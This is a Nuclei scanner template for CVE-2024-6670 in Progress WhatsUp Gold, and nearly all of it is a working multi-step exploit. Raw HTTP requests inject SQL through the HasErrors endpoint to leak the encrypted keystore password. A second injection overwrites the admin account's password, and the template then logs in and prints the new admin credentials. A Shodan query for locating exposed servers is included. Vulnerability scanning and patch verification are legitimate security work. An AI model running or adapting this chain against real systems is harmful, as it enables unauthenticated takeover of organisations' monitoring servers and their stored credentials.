flow: "http(1);\nhttp(2);\nhttp(3);\nencryptedPassword = template.encryptedPassword\n\
  const cleanedInput = encryptedPassword.replace('psyduck', '').match(/\\d+/g);\n\
  const hexValues = cleanedInput.map(value => {\n  const num = parseInt(value);\n\
  \  return isNaN(num) ? '00' : num.toString(16).padStart(2, '0');\n});\nlog(hexValues);\n\
  const hexString = hexValues.join('');\nconst varbinaryString = '0x' + hexString;\n\
  set(\"encryptedPassword\", varbinaryString);\nhttp(4) && http(5);\n"
http:
- matchers:
  - condition: and
    dsl:
    - status_code == 302
    - contains(set_cookie, 'ASP.NET_SessionId=')
    internal: true
    type: dsl
  raw:
  - 'POST /NmConsole/WugSystemAppSettings/JMXSecurity HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/json


    {"KeyStorePassword": "{{password}}", "TrustStorePassword": "{{password}}"}

    '
- matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains(content_type, 'application/json')
    internal: true
    type: dsl
  raw:
  - 'POST /NmConsole/Platform/PerformanceMonitorErrors/HasErrors HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/json


    {"deviceId": "22222", "classId": "DF215E10-8BD4-4401-B2DC-99BB03135F2E'';UPDATE
    ProActiveAlert SET sAlertName=''psyduck''+( SELECT sValue FROM GlobalSettings
    WHERE sName = ''_GLOBAL_:JavaKeyStorePwd'');--", "range": "1", "n": "1", "start":
    "3", "end": "4", "businesdsHoursId": "5"}

    '
- extractors:
  - internal: true
    name: encryptedPassword
    regex:
    - '"psyduck\d+(,\d+)*"'
    type: regex
  matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains(body, 'DisplayName')
    internal: true
    type: dsl
  raw:
  - 'GET /NmConsole/Platform/Filter/AlertCenterItemsReportThresholds HTTP/1.1

    Host: {{Hostname}}

    '
- matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains(body, 'false')
    internal: true
    type: dsl
  raw:
  - 'POST /NmConsole/Platform/PerformanceMonitorErrors/HasErrors HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/json


    {"deviceId": "22222", "classId": "DF215E10-8BD4-4401-B2DC-99BB03135F2E'';UPDATE
    WebUser SET sPassword = {{encryptedPassword}} where sUserName = ''admin'';--",
    "range": "1", "n": "1", "start": "3", "end": "4", "businesdsHoursId": "5"}

    '
- extractors:
  - dsl:
    - '"USER: "+ username'
    - '"PASS: "+ password'
    type: dsl
  matchers:
  - condition: and
    part: body
    type: word
    words:
    - '"authenticated":true'
    - '"username":"'
  raw:
  - 'POST /NmConsole/User/LoginAjax HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    username={{username}}&password={{password}}&rememberMe=false

    '
id: CVE-2024-6670
info:
  author: DhiyaneshDK,princechaddha
  classification:
    cpe: cpe:2.3:a:progress:whatsup_gold:*:*:*:*:*:*:*:*
    cve-id: CVE-2024-6670
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-89
    epss-percentile: 0.99996
    epss-score: 0.94468
  description: 'In WhatsUp Gold versions released before 2024.0.0, a SQL Injection
    vulnerability allows an unauthenticated attacker to retrieve the users encrypted
    password.

    '
  impact: 'Unauthenticated attackers can exploit SQL injection to retrieve encrypted
    user passwords, modify admin credentials, and achieve authentication bypass for
    full system access.

    '
  metadata:
    max-request: 4
    product: whatsup_gold
    shodan-query: title:"WhatsUp Gold" http.favicon.hash:-2107233094
    vendor: progress
    verified: true
  name: WhatsUp Gold HasErrors SQL Injection - Authentication Bypass
  reference:
  - https://github.com/sinsinology/CVE-2024-6670
  - https://community.progress.com/s/article/WhatsUp-Gold-Security-Bulletin-August-2024
  - https://www.progress.com/network-monitoring
  remediation: 'Update WhatsUp Gold to version 2024.0.0 or later to address the SQL
    injection vulnerability.

    '
  severity: critical
  tags: cve,cve2024,whatsup-gold,auth-bypass,sqli,intrusive,kev,vkev,vuln
variables:
  password: '{{to_lower(rand_text_alpha(8))}}'
  username: admin
